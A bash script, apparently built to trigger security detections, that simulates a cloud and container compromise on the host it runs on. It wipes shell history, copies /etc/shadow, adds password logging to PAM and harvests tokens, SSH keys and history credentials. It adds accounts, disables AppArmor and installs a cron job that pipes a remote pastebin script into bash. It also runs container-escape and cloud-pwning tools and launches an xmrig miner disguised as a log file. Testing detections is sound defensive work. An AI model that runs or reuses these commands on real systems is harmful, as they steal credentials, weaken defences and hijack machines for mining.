#!/usr/bin/env bash
#
# CloudAndContainerCompromiseSimulator
# 
# This can be used an easy way of triggering detections for cloud and container compromise scenarios
# Do not run this on production systems
#
#  ____  _                 _       _
# / ___|(_)_ __ ___  _   _| | __ _| |_ ___  _ __
# \___ \| | '_ ` _ \| | | | |/ _` | __/ _ \| '__|
#  ___) | | | | | | | |_| | | (_| | || (_) | |
# |____/|_|_| |_| |_|\__,_|_|\__,_|\__\___/|_|
#
#

echo = `date` - Setting Up =

echo Wiping Bash History, before starting execution
# https://github.com/uber-common/metta/blob/master/MITRE/Defense_Evasion/defenseevasion_linux_unset_histfile.yml
rm ~/.bash_history 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null
history -c
echo "killall -9 kinsing" >> /root/.bash_history
echo "sysctl -w vm.nr_hugepages=128" >> /root/.bash_history
echo "git clone https://github.com/xmrig/xmrig.git" >> /root/.bash_history

echo Setting fake AWS Credentials to be stolen later
mkdir /root/.aws 2>/dev/null
echo "[default]" >> /root/.aws/credentials
echo "aws_access_key_id = AKAAAAAAA_AccessKey" >> /root/.aws/credentials
echo "aws_secret_access_key = qLlZ_SecretKey" >> /root/.aws/credentials

echo Setting fake logs
cp ./logs/access.log /var/log/apache.log
mkdir -p /var/www/html/wp-content/plugins/uploads/
cp ./logs/a.php /var/www/html/wp-content/plugins/uploads/a.php
cp ./logs/a.sh /var/www/html/wp-content/plugins/uploads/a.sh



echo Executing Atomic Tests for Linux
cat /etc/passwd > /tmp/passwd
cat /etc/shadow > /tmp/shadow
# Via https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/linux-index.md under MIT License
whoami
for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
if  test -f /etc/pam.d/password-auth; then  cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi; if  test -f /etc/pam.d/system-auth; then  cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;  touch /tmp/password-auth.bk  touch /tmp/system-auth.bk  echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/password-auth  echo "session    required    pam_tty_audit.so enable=* log_password" >> /etc/pam.d/system-auth
PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
tail /var/log/syslog
kubectl --context example-cluster exec test-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
timeout -s SIGKILL 5 tcpdump -c 5 -nnni en0
cat /etc/login.defs
useradd evil_account
useradd nromanoff
useradd radvlad
cat ~/.ssh/authorized_keys

echo Running GuardDuty Triggers
# Via https://github.com/awslabs/amazon-guardduty-tester under Apache 2.0 License
echo "Calling bitcoin wallets to download mining toolkits"
curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
echo "Calling large numbers of large domains to simulate tunneling via DNS" 
dig -f ./bins/queries.txt > /dev/null &
echo
echo "Calling a well known fake domain that is used to generate a known finding"
dig GuardDutyC2ActivityB.com any

echo Installing Docker
if [ "$(grep -Ei 'debian|buntu|mint' /etc/*release)" ]; then
   apt-get update
   apt-get -y install docker.io
   apt-get -y install crontab
   service docker start
fi

if [ -n "$(command -v yum)" ]; then
    yum update -y
    amazon-linux-extras install docker -y
    yum install -y docker
    yum install -y cronie
    service docker start
fi

echo Installing MiniKube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube
/usr/local/bin/minikube start   2>/dev/null
/usr/local/bin/minikube kubectl get po -A   2>/dev/null
/usr/local/bin/minikube kubectl -- get po -A  2>/dev/null
/usr/local/bin/minikube dashboard  2>/dev/null
/usr/local/bin/minikube kubectl create deployment hello-minikube --image=k8s.gcr.io/echoserver:1.4  2>/dev/null
/usr/local/bin/minikube kubectl expose deployment hello-minikube --type=NodePort --port=8080  2>/dev/null
/usr/local/bin/minikube kubectl create deployment monero-miner --image=monero/miner  2>/dev/null

echo = Running Cloud and Container Pen-Test Tools =

echo Copying Binaries to /tmp for Execution
mkdir /tmp/bins 2>/dev/null
cp -r ./bins/* /tmp/bins 2>/dev/null
chmod +x /tmp/bins/*

echo Hiding xmrig as a .log file...
cp ./bins/xmrig /var/log/legit.log
chmod +x /var/log/legit.log
chmod 777 /var/log/legit.log
cp ./bins/xmrig /tmp/.uuXXX9sqAAqwxAAQQjjyhd00


echo Running Break Out The Box
timeout -s SIGKILL 60 /tmp/bins/botb -scrape-gcp=true -recon=true -metadata=true -find-http=true -find-sockets=true -find-docker=true -pwnKeyctl=true -k8secrets=true -pwn-privileged= -autopwn=true -keyMin=0 -keyMax=100000000 -k8secrets=true > /tmp/botb_output.txt 2>/dev/null

echo Running kubeletmein
timeout -s SIGKILL 60 /tmp/bins/kubeletmein generate > /tmp/kubeletmein_output.txt 2>/dev/null
timeout -s SIGKILL 60 /tmp/bins/kubeletmein gke bootstrap >> /tmp/kubeletmein_output.txt 2>/dev/null
timeout -s SIGKILL 60 /tmp/bins/kubeletmein gke generate -n anything >> /tmp/kubeletmein_output.txt 2>/dev/null

echo Running DigitalOCean Pwner
timeout -s SIGKILL 5 curl -qs http://169.254.169.254/metadata/v1/user-data > user-data.txt 2>/dev/null
timeout -s SIGKILL 5 /tmp/bins/dopwn exploit -f user-data.txt 2>/dev/null

echo Running amicontained Recon tool
timeout -s SIGKILL 60 /tmp/bins/amicontained

echo Running DeepCe
timeout -s SIGKILL 60 /tmp/bins/deepce.sh > /tmp/deepce.txt

echo Running AWS Dump
timeout -s SIGKILL 60 /tmp/bins/aws_dump.sh > /tmp/aws_dump.txt

echo Running go-pillage-registries
chmod +x /tmp/bins/.pilreg
timeout -s SIGKILL 60 /tmp/bins/.pilreg 127.0.0.1:5000 > /tmp/pillreg.txt

echo Executing peirates in interactive mode
timeout -s SIGKILL 5 /tmp/bins/peirates -i 127.0.0.1 -p 80

echo = Running Classic Mining Worm Capabilities =

echo Adding to cron
# This just runs "echo Hello World"
echo "* * * * * https://pastebin.com/raw/XCkjzVUv | bash > /tmp/cron.txt 2>&" | crontab -

echo Searching for keys
# https://github.com/uber-common/metta/blob/master/MITRE/Credential_Access/credacces_linux_searchprivatekeys.yaml
grep /home/ -irw -e "BEGIN RSA PRIVATE" > rsa_keys.txt 2>/dev/null
grep /home/ -irw -e "BEGIN DSA PRIVATE" > dsa_keys.txt 2>/dev/null

echo Searching for credentials in bash history
# https://github.com/uber-common/metta/blob/master/MITRE/Credential_Access/credaccess_linux_bash_history.yml
cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt 2>/dev/null
cat loot_bash.txt 2>/dev/null
cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt 2>/dev/null
cat loot_sh.txt 2>/dev/null
cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt 2>/dev/null
cat loot_zsh.txt 2>/dev/null

echo Adding Custom DNS
echo '1.91.204.131 api.nanopool.org' > /etc/hosts

echo Kill existing miners
killall -9 kinsing

echo XMRig Optimisation
sysctl -w vm.nr_hugepages=128

echo Adding SSH Hijack
# https://github.com/uber-common/metta/blob/master/MITRE/Lateral_Movement/lateralmovement_linux_ssh_hijack.yml
grep ~/.ssh/config -e ForwardAgent
ps ef |grep -i -e "ssh-agent"
cat /proc/*/environ |tr -s '\0' '\n' | grep SSH_AUTH_SOCK |sort -u 2>/dev/null > ssh_agent.txt

echo DNS Request for mining pool
timeout -s SIGKILL 5 curl https://api.nanopool.org/

echo Set SSH Key Access
chattr -iae /root/.ssh/
chattr -iae /root/.ssh/authorized_keys

echo Download Aliyun Agent Uninstaller
timeout -s SIGKILL 5 curl http://update.aegis.aliyun.com/download/uninstall.sh

echo Search for Monero Docker images
docker images -a | grep "auto"

echo Create backup invalid ssh account
mkdir /home/temp_user/.ssh/ -p
echo "" > /home/temp_user/.ssh/authorized_keys  
chmod 600 /home/temp_user/.ssh/authorized_keys

echo Disable apparmor
service apparmor stop
systemctl disable apparmor
systemctl enable apparmor
service apparmor stop

echo Disable NMI watchdog
echo '0' >/proc/sys/kernel/nmi_watchdog  2>/dev/null
echo '1' >/proc/sys/kernel/nmi_watchdog  2>/dev/null

echo Running Stratum Protocol via XMRIG
timeout -s SIGKILL 300 /tmp/bins/xmrig



echo `date` - Finished